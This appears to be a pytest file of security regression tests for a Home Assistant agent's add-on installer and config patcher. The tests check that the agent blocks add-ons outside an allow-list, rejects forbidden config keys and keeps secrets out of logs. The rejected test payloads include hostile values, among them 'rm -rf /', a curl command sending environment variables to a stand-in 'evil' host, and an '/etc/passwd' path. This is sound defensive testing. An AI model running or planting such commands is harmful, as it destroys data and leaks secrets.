"""Security-focused regression tests.

These tests pin down the **defense-in-depth** invariants of the chantier-A
endpoints: even with a permissive central / compromised admin token, the
agent must refuse to:

- Install a non-white-listed add-on (RCE via malicious supervisor add-on)
- Patch a non-white-listed HA config key (RCE via ``python_script:``)
- Log secrets in plain text (tokens, age recipient)
"""
from __future__ import annotations

import io
import logging
from unittest.mock import AsyncMock, patch

import pytest

from molini_agent.commands import (
    execute_install_addon,
    execute_patch_ha_config,
)
from molini_agent.yaml_patch import YamlPatchError, compute_patch


# ─── install_addon white-list enforcement ────────────────────────────────────


@pytest.mark.asyncio
async def test_install_addon_rejects_arbitrary_slug():
    with pytest.raises(RuntimeError, match="forbidden_addon"):
        await execute_install_addon(
            {"name": "evil_addon_with_shell_access", "start": True}
        )


@pytest.mark.asyncio
async def test_install_addon_rejects_slug_lookalike():
    """An attacker might try ``mosquitto_evil`` to slip through a naive check."""
    with pytest.raises(RuntimeError, match="forbidden_addon"):
        await execute_install_addon({"name": "mosquitto_evil", "start": True})


@pytest.mark.asyncio
async def test_install_addon_rejects_missing_name():
    with pytest.raises(RuntimeError, match="missing"):
        await execute_install_addon({})


@pytest.mark.asyncio
async def test_install_addon_rejects_non_string_name():
    with pytest.raises(RuntimeError, match="missing"):
        await execute_install_addon({"name": 42})


@pytest.mark.asyncio
async def test_install_addon_rejects_non_dict_options():
    with pytest.raises(RuntimeError, match="invalid `options`"):
        await execute_install_addon(
            {"name": "mosquitto", "options": "not_a_dict"}
        )


@pytest.mark.asyncio
async def test_install_addon_rejects_non_bool_start():
    with pytest.raises(RuntimeError, match="invalid `start`"):
        await execute_install_addon({"name": "mosquitto", "start": "yes"})


# ─── patch_ha_config white-list enforcement ──────────────────────────────────


@pytest.mark.asyncio
async def test_patch_ha_config_rejects_python_script_top_key(tmp_path, monkeypatch):
    monkeypatch.setenv(
        "HA_CONFIG_PATH", str(tmp_path / "configuration.yaml")
    )
    result = await execute_patch_ha_config(
        {"config": {"python_script": {"backdoor": "rm -rf /"}}}
    )
    assert result["ok"] is False
    assert "forbidden_key" in result["error"]
    # The file must not have been created (sanity)
    assert not (tmp_path / "configuration.yaml").exists()


@pytest.mark.asyncio
async def test_patch_ha_config_rejects_shell_command(tmp_path, monkeypatch):
    monkeypatch.setenv(
        "HA_CONFIG_PATH", str(tmp_path / "configuration.yaml")
    )
    result = await execute_patch_ha_config(
        {"config": {"shell_command": {"steal": "curl http://evil/?$(env)"}}}
    )
    assert result["ok"] is False
    assert "forbidden_key" in result["error"]


@pytest.mark.asyncio
async def test_patch_ha_config_rejects_missing_config():
    with pytest.raises(RuntimeError, match="missing"):
        await execute_patch_ha_config({})


@pytest.mark.asyncio
async def test_patch_ha_config_rejects_non_dict_config():
    with pytest.raises(RuntimeError, match="missing"):
        await execute_patch_ha_config({"config": "not_a_dict"})


@pytest.mark.asyncio
async def test_patch_ha_config_accepts_whitelisted_keys(tmp_path, monkeypatch):
    target = tmp_path / "configuration.yaml"
    monkeypatch.setenv("HA_CONFIG_PATH", str(target))
    result = await execute_patch_ha_config(
        {
            "config": {
                "http": {"use_x_forwarded_for": True},
                "recorder": {"purge_keep_days": 14},
            }
        }
    )
    assert result["ok"] is True
    assert result["changed"] is True
    assert target.exists()


# ─── Logging: secrets must not appear in plain text ──────────────────────────


def test_compute_patch_does_not_log_input_values(caplog):
    """``compute_patch`` should not echo patch values to logs (defense vs token leak)."""
    caplog.set_level(logging.DEBUG, logger="molini_agent.yaml_patch")
    sensitive = "SUPER_SECRET_TUNNEL_TOKEN_12345"
    # Use a field that's allowed but conceptually could leak (e.g. tts API key)
    compute_patch(
        "default_config:\n",
        {"tts": {"some_api_key": sensitive}},
    )
    # The sensitive value should not be in caplog records
    all_messages = "\n".join(r.getMessage() for r in caplog.records)
    assert sensitive not in all_messages


def test_apply_patch_to_file_only_logs_keys_not_values(tmp_path, caplog):
    """``apply_patch_to_file`` logs the keys that were applied but never values."""
    from molini_agent.yaml_patch import apply_patch_to_file

    target = tmp_path / "configuration.yaml"
    target.write_text("default_config:\n", encoding="utf-8")

    caplog.set_level(logging.INFO, logger="molini_agent.yaml_patch")
    sensitive = "SECRET_VALUE_THAT_SHOULD_NEVER_BE_LOGGED"
    apply_patch_to_file(
        str(target),
        {"tts": {"api_key": sensitive}},
    )

    all_messages = "\n".join(r.getMessage() for r in caplog.records)
    assert sensitive not in all_messages
    # The key should be in the log (so admins can audit which keys changed)
    assert "tts" in all_messages


# ─── End-to-end RCE attempts ─────────────────────────────────────────────────
# Composite check: even if an attacker manages to call execute_patch_ha_config
# directly with a mix of allowed and forbidden keys, the whole patch is rejected
# (no partial application).


@pytest.mark.asyncio
async def test_mixed_allowed_and_forbidden_keys_all_rejected(
    tmp_path, monkeypatch
):
    target = tmp_path / "configuration.yaml"
    target.write_text("default_config:\n", encoding="utf-8")
    monkeypatch.setenv("HA_CONFIG_PATH", str(target))

    initial_content = target.read_text(encoding="utf-8")
    result = await execute_patch_ha_config(
        {
            "config": {
                "http": {"use_x_forwarded_for": True},  # allowed
                "python_script": {},  # forbidden
            }
        }
    )
    assert result["ok"] is False
    # File must not have been mutated at all
    assert target.read_text(encoding="utf-8") == initial_content


# ─── Path traversal protection ───────────────────────────────────────────────


@pytest.mark.asyncio
async def test_patch_ha_config_only_writes_to_default_path(
    tmp_path, monkeypatch
):
    """The patcher hard-codes ``/config/configuration.yaml`` (or HA_CONFIG_PATH env).

    Verify that an attacker cannot smuggle a custom path through the payload —
    there's no ``path`` field in the command payload by design.
    """
    target = tmp_path / "isolated" / "configuration.yaml"
    monkeypatch.setenv("HA_CONFIG_PATH", str(target))

    # Even if the payload had a ``path`` key, it would be ignored.
    result = await execute_patch_ha_config(
        {
            "config": {"http": {"use_x_forwarded_for": True}},
            "path": "/etc/passwd",  # red herring — must be ignored
        }
    )
    assert result["ok"] is True
    # The default path was used; /etc/passwd is untouched (assertion impossible
    # on Windows but we can confirm the target dir was used)
    assert target.exists()
    assert "use_x_forwarded_for" in target.read_text(encoding="utf-8")
